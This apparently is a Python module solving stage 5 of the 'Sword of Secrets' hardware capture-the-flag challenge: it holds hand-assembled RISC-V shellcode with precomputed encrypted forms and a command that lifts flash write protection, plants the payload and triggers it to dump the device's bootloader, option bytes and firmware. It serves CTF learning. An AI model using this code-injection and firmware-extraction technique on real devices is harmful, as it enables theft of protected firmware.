"""
Walkthrough to solve the Sword of Secrets hardware CTF.

This is SPOILER RICH content.  Do NOT read if you wish
to enjoy the challenge of the CTF on your own!
"""

from __future__ import annotations

import asyncio
from binascii import Error

from ..command_registry import CommandContext, CommandRegistry
from enum import Enum
from typing import Literal, Sequence, Tuple, overload, TypeAlias
from . import sword_of_secrets as sos
from . import sword_of_secrets_spoilers_1 as sos1
from . import sword_of_secrets_spoilers_2 as sos2
from . import sword_of_secrets_spoilers_3 as sos3
from . import sword_of_secrets_spoilers_4 as sos4

# ---------------------------------------------------------------------------
# Enums and types
# ---------------------------------------------------------------------------
class ReplacementForTheSwordOfSecretsFunction:
    def __init__(self, name: str, cleartext: bytes, ciphertext: bytes) -> None:
        if len(cleartext) < 1 or len(cleartext) > 0x7F:
            raise ValueError("Cleartext length must be between 1 and 127 bytes.")
        pad_len = 16 - (len(cleartext) % 16)
        if pad_len == 0:
            pad_len = 16
        if len(ciphertext) != len(cleartext) + pad_len:
            raise ValueError("Ciphertext length must be cleartext length + padding length.")
        # once you have the challenge AES key,
        # you can create this class with only
        # one of: cleartext, plaintext, or ciphertext,
        # and generate the other two using the key.
        self._name = name
        self._cleartext = cleartext
        self._plaintext = bytes( cleartext + bytes([pad_len] * pad_len ) )
        self._ciphertext = ciphertext

    @property
    def name(self) -> str:
        return self._name
    @property
    def cleartext(self) -> bytes:
        return self._cleartext
    @property
    def plaintext(self) -> bytes:
        return self._plaintext
    @property
    def ciphertext(self) -> bytes:
        return self._ciphertext


# ---------------------------------------------------------------------------
# Registration entry point
# ---------------------------------------------------------------------------

def register_sword_of_secrets_spoilers_5(registry: CommandRegistry) -> None:
    """Populate *registry* with the three example commands."""
    registry.register(
        "fwdump", cmd_encrypted_firmware_dumper,
        "Write encrypted code that dumps firmware.",
        usage="fwdump",
        category="Sword of Secrets - Stage 5 Spoilers"
    )

# ---------------------------------------------------------------------------
# Global (const) data
# ---------------------------------------------------------------------------

# empty hash table of the replacement codes
REPLACEMENT_FUNCTIONS: dict[str, ReplacementForTheSwordOfSecretsFunction] = {}

if True:
    # first attempt ... Yes, the concept works!
    test = ReplacementForTheSwordOfSecretsFunction(
        name="test",
        cleartext=bytes(
            # incoming: a0 == println pointer, a1 == success flag string
            # first swap a0 and a1, using 3x XOR operations, with zero extra registers
            # a0 ^= a1
            # a1 ^= a0
            # a0 ^= a1
            b'\x2d\x8d'         +  #     8d2d        # c.xor  a0,a1
            b'\xa9\x8d'         +  #     8da9        # c.xor  a1,a0
            b'\x2d\x8d'         +  #     8d2d        # c.xor  a0,a1
            # now a0 == success flag string, a1 == println pointer
            b'\x15\x05'         +  #     0515
            b'\x82\x85'         +  #     8582        # j println(str) ... tail call
            b''
        ),
        ciphertext=bytes(
            b'\xc4\x73\xb3\x91\x55\xf7\x0c\x0c\xcb\xc9\xeb\x28\xb4\x22\x44\xdd'
        )
    )
    REPLACEMENT_FUNCTIONS["test"] = test
    vendor_and_options = ReplacementForTheSwordOfSecretsFunction(
        name = "vendor_and_options",
        cleartext = bytes(
            b'\x41\x11'         + #     c.addi sp, -16              \n" //     reserve stack                                    
            b'\x2a\xc0'         + #     c.swsp a0, 0(sp)            \n" //     save println pointer                             
            b'\x22\xc4'         + #     c.swsp s0, 8(sp)            \n" //     save callee-saved s0                             
            b'\x06\xc6'         + #     c.swsp ra, 12(sp)           \n" //     save return address                              

            b'\x37\xf4\xff\x1f' + #     lui    s0,0x1ffff           \n" //     s0 = 0x1ffff000
            b'\x13\x04\x04\x7c' + #     addi   s0,s0,0x7c0          \n" //     s0 = 0x1ffff7c0 (start address)
            b'\x93\x04\x04\x08' + #     addi   s1,s0,128            \n" //     s1 = 0x1ffff840 (end address)
                                #                                 \n" //
                                # 1:                              \n" //     main loop                                        
                                # 2:                              \n" //     pcrel anchor for buffer address                  
            b'\x17\x05\x00\x00' + #     auipc  a0, %pcrel_hi(9f)    \n" //     a0 = high part of buffer address
            b'\x13\x05\x85\x04' + #     addi   a0, a0, %pcrel_lo(2b)\n" //     a0 = full buffer address
                                #                                 \n" //
            b'\xaa\x85'         + #     c.mv   a1, a0               \n" //     a1 = writable cursor into buffer
            b'\x22\x86'         + #     c.mv   a2, s0               \n" //     a2 = address to hex-format
            b'\x29\x28'         + #     c.jal  3f                   \n" //     call hex8 helper
                                #                                 \n" //
            b'\x89\x05'         + #     c.addi a1, 2                \n" //     Skip the literal ': ' separator
                                #                                 \n" //
            b'\x10\x40'         + #     c.lw   a2, 0(s0)            \n" //     a2 = value to hex-format
            b'\x11\x28'         + #     c.jal  3f                   \n" //     call hex8 helper
                                #                                 \n" //
            b'\x82\x47'         + #     c.lwsp a5, 0(sp)            \n" //     load println() pointer from stack
            b'\x82\x97'         + #     c.jalr a5                   \n" //     call println()
                                #                                 \n" //
            b'\x11\x04'         + #     c.addi s0, 4                \n" //     address increments by 4 each
                                #                                 \n" //
            b'\xe3\x63\x94\xfe' + #     bltu   s0, s1, 1b           \n" //     continue until start == end
                                #                                 \n" //
            b'\x22\x44'         + #     c.lwsp s0, 8(sp)            \n" //     restore s0 for caller
            b'\xb2\x40'         + #     c.lwsp ra, 12(sp)           \n" //     restore ra
            b'\x41\x01'         + #     c.addi sp, 16               \n" //     release reserved stack
            b'\x82\x80'         + #     ret                         \n" //     return
                                #                                 \n" //
                                #                                 \n" //
                                #                                 \n" //
                                # 3:                              \n" // hex8 dump helper
            b'\xa1\x46'         + #     c.li   a3, 8                \n" // nibble count
                                # 4:                              \n" // 
            b'\x32\x87'         + #     c.mv   a4, a2               \n" // copy working value
            b'\x3d\x8b'         + #     c.andi a4, 15               \n" // isolate low nibble [0..15]
            b'\x13\x07\x07\x03' + #     addi   a4, a4, 48           \n" // bias to ASCII '0'..'?'
            b'\x93\x37\xa7\x03' + #     sltiu  a5, a4, 58           \n" // true if <= '9'
            b'\x99\xe3'         + #     c.bnez a5, 5f               \n" // if digit, skip alpha adjustment
            b'\x13\x07\x77\x02' + #     addi   a4, a4, 39           \n" // map ':'..'?' -> 'a'..'f'
                                # 5:                              \n" // 
            b'\x23\x80\xe5\x00' + #     sb     a4, 0(a1)            \n" // store one hex char
            b'\x85\x05'         + #     c.addi a1, 1                \n" // advance destination
                                #                                 \n" //
            b'\x11\x82'         + #     c.srli a2, 4                \n" // next nibble
            b'\xfd\x16'         + #     c.addi a3, -1               \n" // one fewer nibbles remain
            b'\xf5\xf2'         + #     c.bnez a3, 4b               \n" // repeat while more nibbles remain
            b'\x82\x80'         + #     c.jr   ra                   \n" // else return to caller
                                #                                 \n" //
                                #                                 \n" //
                                # 9:                              \n" // 
            b'I' * 8 + b': '    + # .asciz \"IIIIIIII: 00000000\"     \n" // 
            b'0' * 8 + b'\x00'    # .asciz \"IIIIIIII: 00000000\"     \n" // 
        ),
        ciphertext = bytes(
        b'\x6c\x32\xdf\x23\xec\x90\x8d\x5b\x9e\xb3\xde\xde\xd8\x66\xa2\x8c'
        b'\x4b\x1a\xe3\x77\xe8\x77\x1c\xe7\x55\xf7\xda\xa3\x75\x86\xdf\x8e'
        b'\x24\x61\xc5\x80\xf0\x23\xf5\x4a\xc5\xf8\x1c\x8e\x88\xfd\xc5\xbd'
        b'\x7a\x90\xc7\x4e\x7d\xbb\x6d\xe2\x2d\x26\x4c\x0e\x1b\x5f\x07\x3f'
        b'\x08\x59\xce\x34\x2e\xac\x88\x59\x96\x77\x41\x0d\x0a\xc0\xcd\x33'
        b'\x5a\xbb\x0b\x68\xa5\xb5\xd1\x0b\xfb\x42\x9d\x0d\x0f\x38\x3d\xe0'
        b'\x71\xdc\x1d\xd8\x0c\x0c\xec\x3d\x7f\x2a\x24\x2b\x33\x43\x5d\x32'
        )
    )
    REPLACEMENT_FUNCTIONS["vendor_and_options"] = vendor_and_options
    firmware = ReplacementForTheSwordOfSecretsFunction(
        name = "firmware",
        cleartext = bytes(
            b'\x41\x11'         + #     c.addi sp, -16              \n" //     reserve stack                                    
            b'\x2a\xc0'         + #     c.swsp a0, 0(sp)            \n" //     save println pointer                             
            b'\x22\xc4'         + #     c.swsp s0, 8(sp)            \n" //     save callee-saved s0                             
            b'\x06\xc6'         + #     c.swsp ra, 12(sp)           \n" //     save return address                              
                                #                                   \n" //                                                      
            b'\x01\x44'         + #     c.li   s0, 0                \n" //     s0 = current address (start = 0x00000000)        
                                #                                   \n" //
                                # 1:                                \n" //     main loop                                        
                                # 2:                                \n" //     pcrel anchor for buffer address                  
            b'\x17\x05\x00\x00' + #     auipc a0, %pcrel_hi(9f)     \n" //     a0 = high part of buffer address                 
            b'\x13\x05\xa5\x04' + #     addi  a0, a0, %pcrel_lo(2b) \n" //     a0 = full buffer address (+0x04A)                
            b'\xaa\x85'         + #     c.mv  a1, a0                \n" //     a1 = output cursor (start of "IIIIIIII...")      
                                #                                   \n" //
            b'\x22\x86'         + #     c.mv  a2, s0                \n" //     a2 = value to hex-format (address)               
            b'\x31\x28'         + #     c.jal 3f                    \n" //     write 8 hex chars into "IIIIIIII"                
                                #                                   \n" //
            b'\x89\x05'         + #     c.addi a1, 2                \n" //     skip ": "                                        
                                #                                   \n" //
            b'\x10\x40'         + #     c.lw  a2, 0(s0)             \n" //     second field uses value at that address           
            b'\x19\x28'         + #     c.jal 3f                    \n" //     write 8 hex chars into "00000000"                
                                #                                   \n" //
            b'\x82\x47'         + #     c.lwsp a5, 0(sp)            \n" //     reload println pointer                           
            b'\x82\x97'         + #     c.jalr a5                   \n" //     call println(buffer)                             
                                #                                   \n" //                                                      
            b'\x11\x04'         + #     c.addi s0, 4                \n" //     next 32-bit aligned address                      
            b'\x91\x67'         + #     c.lui a5, 4                 \n" //     a5 = 0x00004000 (end, exclusive)                 
            b'\xe3\x62\xf4\xfe' + #     bltu s0, a5, 1b             \n" //     loop while s0 < end                              
                                #                                   \n" //                                                      
            b'\x22\x44'         + #     c.lwsp s0, 8(sp)            \n" //     restore s0                                       
            b'\xb2\x40'         + #     c.lwsp ra, 12(sp)           \n" //     restore return address                           
            b'\x41\x01'         + #     c.addi sp, 16               \n" //     release stack                                    
            b'\x82\x80'         + #     ret                         \n" //     return to caller                                 
                                #                                   \n" //     /////////////////////////////////////////////////
                                # 3:                                \n" //     hex8 routine: write 8 nibbles (LS nibble first)  
            b'\xa1\x46'         + #     c.li   a3, 8                \n" //     nibble count                                     
                                # 4:                                \n" //                                                      
            b'\x32\x87'         + #     c.mv   a4, a2               \n" //     copy current value                               
            b'\x3d\x8b'         + #     c.andi a4, 15               \n" //     extract low nibble                               
            b'\x13\x07\x07\x03' + #     addi   a4, a4, 48           \n" //     convert 0..15 to '0'..'?' base                   
            b'\x93\x37\xa7\x03' + #     sltiu  a5, a4, 58           \n" //     test if <= '9'                                   
            b'\x99\xe3'         + #     c.bnez a5, 5f               \n" //     if digit, skip alpha adjustment                  
            b'\x13\x07\x77\x02' + #     addi   a4, a4, 39           \n" //     adjust to 'a'..'f'                               
                                # 5:                                \n" //                                                      
            b'\x23\x80\xe5\x00' + #     sb     a4, 0(a1)            \n" //     store one ASCII char                             
            b'\x85\x05'         + #     c.addi a1, 1                \n" //     advance output cursor                            
            b'\x11\x82'         + #     c.srli a2, 4                \n" //     shift next nibble into place                     
            b'\xfd\x16'         + #     c.addi a3, -1               \n" //     decrement nibble count                           
            b'\xf5\xf2'         + #     c.bnez a3, 4b               \n" //     continue until 8 nibbles done                    
            b'\x82\x80'         + #     c.jr   ra                   \n" //     return to caller                                 
                                #                                   \n" //                                                      
                                # 9:                                \n" //                                                      
            b'I' * 8 + b': ' +  # .asciz "IIIIIIII: 00000000"                                                                                         
            b'0' * 8 + b'\x00'  # .asciz "IIIIIIII: 00000000"                                                                                         
        ),
        ciphertext = bytes(
            b'\x76\x85\x04\x9d\x3c\x4f\xe0\x24\xd5\x3e\x7a\x5c\x87\xce\x21\xaf'
            b'\xea\xff\x33\xdf\xbd\x6c\x25\x4e\xf7\xfe\x5b\x18\xa6\xca\xe7\x91'
            b'\xa4\x64\x04\x37\xad\xd4\x39\xc9\x25\xb4\xe7\x78\xe1\xe4\x14\x3b'
            b'\x8b\xc5\x19\x51\x5d\x91\x2e\xab\xbf\xb6\x90\x07\x97\xa5\x57\xdf'
            b'\x12\xa8\x9b\xe4\x00\xb3\x36\xa7\x6d\x23\xa5\x03\xf0\xd8\xdb\x07'
            b'\x37\x05\x46\x48\x83\xde\x75\x0a\x58\x03\x75\x7d\x92\x87\x17\xf3'
            b'\x1d\xd6\x7c\x52\xca\xe3\x49\x22\x3f\xaf\x8c\x75\x32\xf9\x95\x1e'
        )
    )
    REPLACEMENT_FUNCTIONS["firmware"] = firmware
    bootloader = ReplacementForTheSwordOfSecretsFunction(
        name="bootloader",
        cleartext=bytes(
            b'\x41\x11'         + #     c.addi sp, -16              \n" //     reserve stack                                    
            b'\x2a\xc0'         + #     c.swsp a0, 0(sp)            \n" //     save println pointer                             
            b'\x22\xc4'         + #     c.swsp s0, 8(sp)            \n" //     save callee-saved s0                             
            b'\x06\xc6'         + #     c.swsp ra, 12(sp)           \n" //     save return address                              
                                #                                 \n" //                                                      
            b'\x37\xf4\xff\x1f' + #     lui    s0, 0x1FFFF          \n" //     s0 = 0x1FFFF000 == start address
            b'\x13\x05\x04\x78' + #     addi   a0, s0, 0x780        \n" //     a0 = 0x1FFFF780 == end address
            b'\x2a\xc2'         + #     c.swsp a0, 4(sp)            \n" //     save end address at offset 4
                                #                                 \n" //
                                # 1:                              \n" //     main loop                                        
                                # 2:                              \n" //     pcrel anchor for buffer address                  
            b'\x17\x05\x00\x00' + #     auipc a0, %pcrel_hi(9f)     \n" //     a0 = high part of buffer address                 
            b'\x13\x05\xa5\x04' + #     addi  a0, a0, %pcrel_lo(2b) \n" //     a0 = full buffer address                         
            b'\xaa\x85'         + #     c.mv  a1, a0                \n" //     a1 = output cursor (start of "IIIIIIII...")      
                                #                                 \n" //
            b'\x22\x86'         + #     c.mv  a2, s0                \n" //     a2 = value to hex-format (address)               
            b'\x31\x28'         + #     c.jal 3f                    \n" //     write 8 hex chars into "IIIIIIII"                
                                #                                 \n" //
            b'\x89\x05'         + #     c.addi a1, 2                \n" //     skip ": "                                        
                                #                                 \n" //
            b'\x10\x40'         + #     c.lw  a2, 0(s0)             \n" //     second field uses value at that address           
            b'\x19\x28'         + #     c.jal 3f                    \n" //     write 8 hex chars into "00000000"                
                                #                                 \n" //
            b'\x82\x47'         + #     c.lwsp a5, 0(sp)            \n" //     reload println pointer                           
            b'\x82\x97'         + #     c.jalr a5                   \n" //     call println(buffer)                             
                                #                                 \n" //                                                      
            b'\x11\x04'         + #     c.addi s0, 4                \n" //     next 32-bit aligned address                      
            b'\x92\x47'         + #     c.lwsp a5, 4(sp)            \n" //     a5 = 0x1FFFF780 (end, exclusive)                 
            b'\xe3\x62\xf4\xfe' + #     bltu s0, a5, 1b             \n" //     loop while s0 < end                              
                                #                                 \n" //                                                      
            b'\x22\x44'         + #     c.lwsp s0, 8(sp)            \n" //     restore s0                                       
            b'\xb2\x40'         + #     c.lwsp ra, 12(sp)           \n" //     restore return address                           
            b'\x41\x01'         + #     c.addi sp, 16               \n" //     release stack                                    
            b'\x82\x80'         + #     ret                         \n" //     return to caller                                 
                                #                                   \n" //     /////////////////////////////////////////////////
                                # 3:                                \n" //     hex8 routine: write 8 nibbles (LS nibble first)  
            b'\xa1\x46'         + #     c.li   a3, 8                \n" //     nibble count                                     
                                # 4:                                \n" //                                                      
            b'\x32\x87'         + #     c.mv   a4, a2               \n" //     copy current value                               
            b'\x3d\x8b'         + #     c.andi a4, 15               \n" //     extract low nibble                               
            b'\x13\x07\x07\x03' + #     addi   a4, a4, 48           \n" //     convert 0..15 to '0'..'?' base                   
            b'\x93\x37\xa7\x03' + #     sltiu  a5, a4, 58           \n" //     test if <= '9'                                   
            b'\x99\xe3'         + #     c.bnez a5, 5f               \n" //     if digit, skip alpha adjustment                  
            b'\x13\x07\x77\x02' + #     addi   a4, a4, 39           \n" //     adjust to 'a'..'f'                               
                                # 5:                                \n" //                                                      
            b'\x23\x80\xe5\x00' + #     sb     a4, 0(a1)            \n" //     store one ASCII char                             
            b'\x85\x05'         + #     c.addi a1, 1                \n" //     advance output cursor                            
            b'\x11\x82'         + #     c.srli a2, 4                \n" //     shift next nibble into place                     
            b'\xfd\x16'         + #     c.addi a3, -1               \n" //     decrement nibble count                           
            b'\xf5\xf2'         + #     c.bnez a3, 4b               \n" //     continue until 8 nibbles done                    
            b'\x82\x80'         + #     c.jr   ra                   \n" //     return to caller                                 
                                #                                   \n" //                                                      
                                # 9:                                \n" //                                                      
            b'I' * 8 + b': ' +  # .asciz "IIIIIIII: 00000000"                                                                                         
            b'0' * 8 + b'\x00'  # .asciz "IIIIIIII: 00000000"                                                                                         
        ),
        ciphertext=bytes(
            b'\xc2\x0e\x3c\x83\x83\xad\xf5\xd2\xfe\xf2\x70\x02\x26\x9c\xc9\x3b'
            b'\x47\xb1\x5e\x1b\xc1\xb8\x25\xab\x6a\x42\x8c\x8e\x47\x9e\x59\x74'
            b'\xf2\x2a\x66\xca\x3a\xf3\xfc\xab\xee\xa1\xe4\x44\x33\x02\xb4\x4d'
            b'\xd9\xa6\x2d\xb9\x9a\x7a\x39\xe1\xd4\xb1\xa2\x87\x7a\xce\x17\xb5'
            b'\xd3\xed\x12\xe9\x1b\xe4\x9d\xf3\xcf\xd3\xde\x31\x07\xb9\x6f\x06'
            b'\xfd\x93\xef\xe4\x12\x71\xed\x4f\x2c\x65\x82\x9d\xf7\xdd\x50\xfa'
            b'\x37\xb7\x8f\x85\x09\x64\x68\x34\x36\x03\x60\x60\x56\x07\x4f\x79'
        )
    )
    REPLACEMENT_FUNCTIONS["bootloader"] = bootloader

# ---------------------------------------------------------------------------
# Auto-solve stages 1-4
# ---------------------------------------------------------------------------

async def write_replacement_function(ctx: CommandContext, fn_info: ReplacementForTheSwordOfSecretsFunction) -> None:
    """Enables the given replacement for function theSwordOfSecrets()"""

    with ctx.shell.suppress_serial_output():
        ctx.print_info(f"Encrypted dumper function for '{fn_info.name}':")
        await sos.util_hex_dump(ctx, fn_info.ciphertext, 0x40000)
        
        old_wp_state = await sos.get_write_protect_state(ctx)
        if (old_wp_state != sos.WriteProtectionType.NONE):
            await sos.set_write_protect_state(sos.WriteProtectionType.NONE, ctx)
        
        await sos.erase_flash_4k(0x40000, ctx)
        await sos.write_flash_with_length_prefix(0x40000, fn_info.ciphertext, ctx)

        await sos.set_write_protect_state(sos.WriteProtectionType.INDIVIDUAL_BLOCK_PROTECT, ctx)
        await sos.wps_global_unlock(ctx)
        await sos.wps_lock_block(ctx, 0x40000)

    ctx.print_info(f"Wrote the encrypted dumper function for '{fn_info.name}' to 0x40000.")
async def write_fn_test(ctx: CommandContext) -> None:
    await write_replacement_function(ctx, REPLACEMENT_FUNCTIONS["test"])
async def write_fn_vendor_and_options(ctx: CommandContext) -> None:
    await write_replacement_function(ctx, REPLACEMENT_FUNCTIONS["vendor_and_options"])
async def write_fn_firmware(ctx: CommandContext) -> None:
    await write_replacement_function(ctx, REPLACEMENT_FUNCTIONS["firmware"])
async def write_fn_bootloader(ctx: CommandContext) -> None:
    await write_replacement_function(ctx, REPLACEMENT_FUNCTIONS["bootloader"])

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

async def erase_bf_script(ctx: CommandContext) -> None:
    """Helper function to erase the BF script from flash, so that we can re-run it with different parameters."""
    await sos.erase_flash_4k(0x40000, ctx)
    ctx.print_info("Erased BF script from flash.")

# ---------------------------------------------------------------------------
# Commands registered with serial console
# ---------------------------------------------------------------------------

async def cmd_encrypted_firmware_dumper(args: str, ctx: CommandContext) -> None:
    """Encrypts (and prints) the firmware dumper function, or writes it to flash"""
    args = args.strip()
    if args != "":
        raise ValueError(f"Command takes no arguments, but got: {args!r}")

    ctx.print("Setting up prerequisites")
    await sos4.ensure_bf_dump_prerequisites(
        ctx,
        # executed ... could write another do-nothing function, but this one's fast
        stage4_ciphertext_writer=write_fn_test,
        stage4_bf_script_writer=erase_bf_script
    )
    ctx.print("Dumping vendor and options bytes")
    await sos.erase_flash_4k(0x40000, ctx)
    await write_fn_vendor_and_options(ctx)
    await sos.util_send_command("REBOOT", ctx)
    await sos.util_send_command("SOLVE", ctx)
    ctx.print("Dumping bootloader")
    await sos.erase_flash_4k(0x40000, ctx)
    await write_fn_bootloader(ctx)
    await sos.util_send_command("REBOOT", ctx)
    await sos.util_send_command("SOLVE", ctx)
    ctx.print("Dumping firmware")
    await sos.erase_flash_4k(0x40000, ctx)
    await write_fn_firmware(ctx)
    await sos.util_send_command("REBOOT", ctx)
    await sos.util_send_command("SOLVE", ctx)
    ctx.print("Done")



# ---------------------------------------------------------------------------
# FIN
# ---------------------------------------------------------------------------
